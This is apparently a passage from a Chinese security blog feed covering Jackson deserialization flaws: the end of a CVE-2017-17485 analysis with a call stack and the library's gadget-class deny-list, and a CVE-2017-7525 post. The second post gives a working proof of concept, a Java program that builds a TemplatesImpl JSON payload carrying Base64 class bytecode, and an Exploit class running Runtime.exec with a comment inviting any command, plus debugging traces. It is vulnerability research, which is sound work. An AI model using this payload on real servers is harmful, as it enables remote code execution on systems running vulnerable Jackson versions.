alt=""></p><p>跟进去，调用了Constructor.newInstance()方法来创建新的实例：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/5.png" alt=""></p><p>往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/6.png" alt=""></p><p><strong>注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。</strong></p><p>下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。</p><p>跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/7.png" alt=""></p><p>继续跟下去，invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/8.png" alt=""></p><p>往下，进一步调用doGetBeanNamesForType()函数：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/9.png" alt=""></p><p>在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/10.png" alt=""></p><p>在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/11.png" alt=""></p><p>跟进去，predictBeanType()函数中通过调用determineTargetType()函数来预测Bean类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/12.png" alt=""></p><p>determineTargetType()函数中通过调用()函数来确定目标类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/13.png" alt=""></p><p>跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/14.png" alt=""></p><p>跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/15.png" alt=""></p><p>跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/16.png" alt=""></p><p>后续就是SpEL表达式注入漏洞导致的任意代码执行了。</p><p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。</p><p>调用到evaluate()函数时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)</span><br><span class="line">evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">invokeBeanFactoryPostProcessors:84, PostProcessorRegistrationDelegate (org.springframework.context.support)</span><br><span class="line">invokeBeanFactoryPostProcessors:693, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:531, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:144, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:85, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:18, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons</span><br></pre></td></tr></table></figure><p>在jackson-databind-2.7.9.2-sources.jar!\com\fasterxml\jackson\databind\jsontype\impl\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">    s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">    s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">    s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line">    <span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>);</span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">    s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为啥能修补呢？我们调试看看。</p><p>在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/17.png" alt=""></p><p>在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/18.png" alt=""></p><p>而我们的利用类其继承关系是这样的：…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</p><p>可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。</p><hr><p>OK，下一篇继续其他CVE利用链的分析。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/</id>
    <published>2019-11-16T08:52:35.000Z</published>
    <updated>2019-11-17T11:41:35.214Z</updated>
    
    <content type="html"><![CDATA[<p>本次Jackson反序列化漏洞对于Jackson来说是首例，因此针对这些版本范围的漏洞利用类有很多，这章节只用TemplatesImpl这条在Fastjson也盛行的利用类进行演示，其他利用链在后面的文章中会补充分析。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.6系列 &lt; 2.6.7.1</p><p>Jackson 2.7系列 &lt; 2.7.9.1</p><p>Jackson 2.8系列 &lt; 2.8.8.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>JDK使用1.7版本的，不能使用1.8版本，具体原因后面章节会分析到。</p><p>注意，小版本搞的1.7版本的也会有些不能成功利用，具体要自己测试才知道哪些版本是可用的。</p><p>我本地用的JDK版本为1.7.0_21，之前用的1.7.0_80没成功。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>我本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。</p><p>PoC.java，这里选择以开启DefaultTyping的方式进行反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String exp = readClassStr(<span class="string">"./out/production/JSTest/com/evil/Exploit.class"</span>);</span><br><span class="line">        String jsonInput = aposToQuotes(<span class="string">"&#123;\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n"</span> +</span><br><span class="line">                <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"'transletBytecodes':['"</span>+exp+<span class="string">"'],\n"</span> +</span><br><span class="line">                <span class="string">"'transletName':'mi1k7ea',\n"</span> +</span><br><span class="line">                <span class="string">"'outputProperties':&#123;&#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;\n"</span> +</span><br><span class="line">                <span class="string">"]\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Mi1k7ea mi1k7ea;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">aposToQuotes</span><span class="params">(String json)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">"'"</span>,<span class="string">"\""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassStr</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mi1k7ea.java，要进行反序列化的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java，恶意类，至于为何要继承AbstractTranslet类可以参考<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>中的调试分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//修改成你想要执行的命令</span></span><br><span class="line">            Process p = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"result.txt"</span>);</span><br><span class="line">            <span class="comment">//File file =new File("javaio-appendfile.txt");</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//if file doesnt exists, then create it</span></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//true = append file</span></span><br><span class="line">            FileWriter fileWritter = <span class="keyword">new</span> FileWriter(file.getName(),<span class="keyword">true</span>);</span><br><span class="line">            BufferedWriter bufferWritter = <span class="keyword">new</span> BufferedWriter(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可成功触发弹计算器：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/1.png" alt=""></p><p>Exploit类中换成其他命令的话运行结果保存在result.txt中：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/2.png" alt=""></p><p>这里我们看下PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"object"</span>:[</span><br><span class="line">        <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"transletBytecodes"</span>:[<span class="string">"xxx"</span>],</span><br><span class="line">            <span class="attr">"transletName"</span>:<span class="string">"mi1k7ea"</span>,</span><br><span class="line">            <span class="attr">"outputProperties"</span>:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释下设置的几个JSON键值对：</p><ul><li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>；</li><li>transletName——TemplatesImpl类对象的_name属性值；</li><li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li></ul><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>在<code>mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class);</code>中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。</p><p>下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。</p><p>我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。</p><p>前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，<strong>但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法</strong>：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/4.png" alt=""></p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/3.png" alt=""></p><p>再往下就是反射调用到了getOutputProperties()：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/5.png" alt=""></p><p>再后面就和Fastjson中分析的一样了，这里不再赘述。</p><p>利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数</p><p>到getOutputProperties()时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:105, SetterlessProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:27, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-为什么要设置transletName属性值"><a href="#0x05-为什么要设置transletName属性值" class="headerlink" title="0x05 为什么要设置transletName属性值"></a>0x05 为什么要设置transletName属性值</h2><p>PoC不写该属性值的话会报错，我们调试分析下原因。</p><p>跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/6.png" alt=""></p><p>由于此处_name为null，导致程序提前return了，并未进入后面生成Java了以及新建该Java类实例的代码中，从而也无法成功触发漏洞。</p><p>由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。</p><p>这里我们重新transletName属性带上，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/7.png" alt=""></p><p>因此这个属性值是必须的，不能为null。</p><h2 id="0x06-高版本JDK不能触发的原因——-tfactory"><a 